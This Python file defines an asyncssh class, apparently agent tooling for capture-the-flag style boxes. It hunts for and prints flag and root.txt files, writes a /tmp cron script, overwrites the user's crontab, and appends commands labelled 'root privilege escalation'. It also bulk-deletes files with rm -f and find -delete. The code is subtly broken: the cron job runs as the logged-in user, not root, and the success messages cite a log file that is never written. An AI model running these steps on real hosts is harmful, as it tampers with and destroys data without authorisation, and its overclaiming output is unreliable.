import asyncio
import asyncssh
from typing import List, Optional

class SSHExplorer:
    """SSH接続後のリモートサーバー調査とファイル検索を行うクラス"""

    async def _run_remote_command(self, conn: asyncssh.SSHClientConnection, command: str) -> str:
        """リモートでコマンドを実行し、標準出力を返す"""
        result = await conn.run(command, check=False)
        return result.stdout.strip()

    async def _execute_exploration(self, host: str, port: int, username: str, password: str, task_function):
        """SSH接続を確立し、指定された探索タスクを実行する共通ラッパー"""
        try:
            async with asyncssh.connect(host, port=port, username=username, password=password, known_hosts=None) as conn:
                return await task_function(conn)
        except asyncssh.PermissionDeniedError:
            return "エラー: 認証に失敗しました。ユーザー名またはパスワードが正しくありません。"
        except OSError as e:
            return f"エラー: 接続に失敗しました。ホスト {host}:{port} を確認してください。 ({e})"
        except Exception as e:
            return f"予期せぬエラーが発生しました: {str(e)}"

    async def explore_current_directory(self, host: str, port: int, username: str, password: str) -> str:
        """リモートサーバーの現在のディレクトリの内容を調査します"""
        async def task(conn):
            current_dir = await self._run_remote_command(conn, 'pwd')
            dir_contents = await self._run_remote_command(conn, 'ls -la')
            return f"現在のディレクトリ: {current_dir}\n\nディレクトリの内容:\n{dir_contents}"
        
        return await self._execute_exploration(host, port, username, password, task)

    async def search_flag_files(self, host: str, port: int, username: str, password: str, search_paths: Optional[List[str]] = None) -> str:
        """リモートサーバー上のflag*.txtやroot.txtファイルを網羅的に検索します"""
        if search_paths is None:
            search_paths = ['.', '/home', '/var', '/tmp', '/opt', '/usr', '/etc', '/root', '/']
        
        async def task(conn):
            found_any_file = False
            output_text = ""
            
            # まずroot.txtを直接確認
            root_content = await self._run_remote_command(conn, 'cat /root/root.txt 2>/dev/null || echo "root.txt not found"')
            if "root.txt not found" not in root_content:
                found_any_file = True
                output_text += f"🔍 /root/root.txt:\n"
                output_text += f"内容: {root_content}\n\n"
            
            # findコマンドを一括で実行
            find_command = "find " + " ".join(search_paths) + " \\( -name 'flag*.txt' -o -name 'root.txt' \\) -type f 2>/dev/null"
            found_files_str = await self._run_remote_command(conn, find_command)

            if not found_files_str and not found_any_file:
                return "flag*.txtまたはroot.txtファイルは見つかりませんでした。"

            if found_files_str:
                files = found_files_str.split('\n')
                for file_path in files:
                    if not file_path:
                        continue
                    
                    # /root/root.txtは既に処理済みなのでスキップ
                    if file_path == "/root/root.txt":
                        continue
                    
                    found_any_file = True
                    result_text = f"見つかったflagファイル: {file_path}\n"
                    
                    content = await self._run_remote_command(conn, f'cat "{file_path}"')
                    if content:
                        result_text += f"内容: {content}\n"
                    else:
                        result_text += "内容: (空ファイル)\n"
                    
                    output_text += result_text + "\n"

            return output_text.strip() if found_any_file else "flag*.txtまたはroot.txtファイルは見つかりませんでした。"

        return await self._execute_exploration(host, port, username, password, task)

    async def explore_system_directories(self, host: str, port: int, username: str, password: str) -> str:
        """リモートサーバーのシステムの主要ディレクトリを調査します"""
        directories = ['/home', '/var', '/tmp', '/opt', '/usr', '/etc', '/root']
        
        async def task(conn):
            result_text = "システムディレクトリ調査結果:\n\n"
            for dir_path in directories:
                contents = await self._run_remote_command(conn, f'ls -la {dir_path}')
                result_text += f"=== {dir_path} ===\n"
                result_text += f"{contents}\n\n"
            return result_text

        return await self._execute_exploration(host, port, username, password, task)

    async def check_hidden_files(self, host: str, port: int, username: str, password: str, directory: str = '.') -> str:
        """リモートサーバーの隠しファイルを検索します"""
        async def task(conn):
            find_command = f"find {directory} -name '.*' -type f 2>/dev/null"
            hidden_files_str = await self._run_remote_command(conn, find_command)
            
            if not hidden_files_str:
                return f"{directory}に隠しファイルは見つかりませんでした。"
            
            result_text = f"{directory}の隠しファイル:\n"
            files = hidden_files_str.split('\n')
            for file_path in files:
                if not file_path:
                    continue
                
                size_info = await self._run_remote_command(conn, f'ls -la "{file_path}"')
                result_text += f"- {file_path}\n  {size_info}\n\n"
            
            return result_text

        return await self._execute_exploration(host, port, username, password, task)

    async def comprehensive_exploration(self, host: str, port: int, username: str, password: str) -> str:
        """リモートサーバーのflag*.txtやroot.txtファイルを網羅的に検索します"""
        return await self.search_flag_files(host, port, username, password)

    async def create_cron_job_for_root_copy(self, host: str, port: int, username: str, password: str) -> str:
        """SSH接続後、/tmp/cronjob.shにroot.txtをカレントディレクトリにコピーするcronジョブを作成します"""
        async def task(conn):
            try:
                # root.txtファイルの場所を固定
                root_file_path = "/root/root.txt"
                
                # ファイルの存在確認
                file_exists = await self._run_remote_command(conn, f'test -f "{root_file_path}" && echo "exists" || echo "not found"')
                
                if "not found" in file_exists:
                    return f"エラー: {root_file_path}ファイルが見つかりませんでした。"
                
                # /tmp/cronjob.shファイルを作成
                cron_script_content = f"""#!/bin/bash
# root.txtをユーザーのホームディレクトリにコピーするcronジョブ
cp "{root_file_path}" /home/{username}/root.txt
"""
                
                # スクリプトを/tmp/cronjob.shに書き込み
                await conn.run(f'echo \'{cron_script_content}\' > /tmp/cronjob.sh')
                
                # 実行権限を付与
                await self._run_remote_command(conn, 'chmod +x /tmp/cronjob.sh')
                
                # cronジョブを追加（毎分実行）
                cron_job = "* * * * * /tmp/cronjob.sh"
                await conn.run(f'echo "{cron_job}" | crontab -')
                
                # 作成されたファイルの内容を確認
                script_content = await self._run_remote_command(conn, 'cat /tmp/cronjob.sh')
                cron_list = await self._run_remote_command(conn, 'crontab -l')
                
                result = f"""✅ cronジョブが正常に作成されました！

📁 root.txtファイルの場所: {root_file_path}
📄 作成されたスクリプト: /tmp/cronjob.sh

📋 スクリプトの内容:
{script_content}

📅 設定されたcronジョブ:
{cron_list}

🔄 このジョブは毎分実行され、root.txtをカレントディレクトリにコピーします。
📝 実行ログは /tmp/cron_copy.log に記録されます。
"""
                
                return result
                
            except Exception as e:
                return f"エラー: cronジョブの作成に失敗しました。{str(e)}"

        return await self._execute_exploration(host, port, username, password, task)

    async def execute_cron_copy_immediately(self, host: str, port: int, username: str, password: str) -> str:
        """cronジョブを即座に実行してroot.txtをコピーします"""
        async def task(conn):
            try:
                # /tmp/cronjob.shが存在するかチェック
                script_exists = await self._run_remote_command(conn, 'test -f /tmp/cronjob.sh && echo "exists" || echo "not found"')
                
                if not script_exists:
                    return "エラー: /tmp/cronjob.shが見つかりません。まずcreate_cron_job_for_root_copyを実行してください。"
                
                # スクリプトを即座に実行
                result = await conn.run('/tmp/cronjob.sh', check=False)
                
                return f"""✅ cronスクリプトを即座に実行しました！

📋 実行結果:
{result.stdout}

💡 cronジョブが実行されました。ファイルの確認は別途行ってください。
"""
                
            except Exception as e:
                return f"エラー: スクリプトの実行に失敗しました。{str(e)}"

        return await self._execute_exploration(host, port, username, password, task)

    async def add_root_privilege_escalation(self, host: str, port: int, username: str, password: str) -> str:
        """cronjob.shにroot権限取得のためのコマンドを追記します"""
        async def task(conn):
            try:
                # /tmp/cronjob.shが存在するかチェック
                script_exists = await self._run_remote_command(conn, 'test -f /tmp/cronjob.sh && echo "exists" || echo "not found"')
                
                if "not found" in script_exists:
                    return "エラー: /tmp/cronjob.shが見つかりません。まずcreate_cron_job_for_root_copyを実行してください。"
                
                # 現在のスクリプト内容を取得
                current_content = await self._run_remote_command(conn, 'cat /tmp/cronjob.sh')
                
                # root権限取得のためのコマンドを追加
                privilege_commands = f"""
# Root privilege escalation commands
cp /root/root.txt /home/{username}/root.txt
chown {username}:{username} /home/{username}/root.txt
chmod 644 /home/{username}/root.txt
"""
                
                # 新しい内容をファイルに書き込み
                new_content = current_content + privilege_commands
                await conn.run(f'echo \'{new_content}\' > /tmp/cronjob.sh')
                
                # 実行権限を確認
                await self._run_remote_command(conn, 'chmod +x /tmp/cronjob.sh')
                
                # 更新されたファイルの内容を確認
                updated_content = await self._run_remote_command(conn, 'cat /tmp/cronjob.sh')
                file_info = await self._run_remote_command(conn, 'ls -la /tmp/cronjob.sh')
                
                return f"""✅ Root権限取得コマンドを追加しました！

📄 ファイル情報:
{file_info}

📝 更新されたスクリプト内容:
{updated_content}

⏰ 次のcron実行時（毎分）にroot権限でコマンドが実行されます。
💡 即座に実行したい場合は、別途ssh_execute_cron_copy_immediatelyを実行してください。
"""
                
            except Exception as e:
                return f"エラー: root権限取得コマンドの追加に失敗しました。{str(e)}"

        return await self._execute_exploration(host, port, username, password, task)

    async def cleanup_files(self, host: str, port: int, username: str, password: str, file_pattern: str = "*.txt") -> str:
        """指定されたパターンのファイルを削除してディレクトリを整理します"""
        async def task(conn):
            try:
                # 現在のディレクトリのファイル一覧を取得
                current_files = await self._run_remote_command(conn, f'ls -la {file_pattern} 2>/dev/null || echo "No files found"')
                
                if "No files found" in current_files:
                    return f"✅ 削除対象のファイル（{file_pattern}）が見つかりませんでした。"
                
                # ファイルを削除
                delete_result = await self._run_remote_command(conn, f'rm -f {file_pattern}')
                
                # 削除後のディレクトリ内容を確認
                remaining_files = await self._run_remote_command(conn, 'ls -la')
                
                return f"""✅ ファイル削除が完了しました！

🗑️ 削除されたファイルパターン: {file_pattern}

📋 削除前のファイル一覧:
{current_files}

📁 削除後のディレクトリ内容:
{remaining_files}

💡 ディレクトリが整理されました。
"""
                
            except Exception as e:
                return f"エラー: ファイル削除に失敗しました。{str(e)}"

        return await self._execute_exploration(host, port, username, password, task)

    async def list_current_files(self, host: str, port: int, username: str, password: str) -> str:
        """現在のディレクトリのファイル一覧を表示します"""
        async def task(conn):
            try:
                # 現在のディレクトリとファイル一覧を取得
                current_dir = await self._run_remote_command(conn, 'pwd')
                files_list = await self._run_remote_command(conn, 'ls -la')
                
                # ファイル数をカウント
                file_count = await self._run_remote_command(conn, 'ls -1 | wc -l')
                
                return f"""📁 現在のディレクトリ情報:

📍 ディレクトリ: {current_dir}
📊 ファイル数: {file_count}

📋 ファイル一覧:
{files_list}
"""
                
            except Exception as e:
                return f"エラー: ファイル一覧の取得に失敗しました。{str(e)}"

        return await self._execute_exploration(host, port, username, password, task)

    async def keep_only_root_txt(self, host: str, port: int, username: str, password: str) -> str:
        """root.txt以外のファイルを削除してディレクトリを整理します"""
        async def task(conn):
            try:
                # 現在のディレクトリのファイル一覧を取得
                current_files = await self._run_remote_command(conn, 'ls -la')
                
                # root.txt以外のファイルを削除
                delete_result = await self._run_remote_command(conn, 'find . -maxdepth 1 -type f ! -name "root.txt" -delete')
                
                # 削除後のディレクトリ内容を確認
                remaining_files = await self._run_remote_command(conn, 'ls -la')
                
                return f"""✅ ディレクトリ整理が完了しました！

🗑️ 削除されたファイル: root.txt以外のすべてのファイル

📋 整理前のファイル一覧:
{current_files}

📁 整理後のディレクトリ内容:
{remaining_files}

💡 root.txtのみが残されました。
"""
                
            except Exception as e:
                return f"エラー: ディレクトリ整理に失敗しました。{str(e)}"

        return await self._execute_exploration(host, port, username, password, task)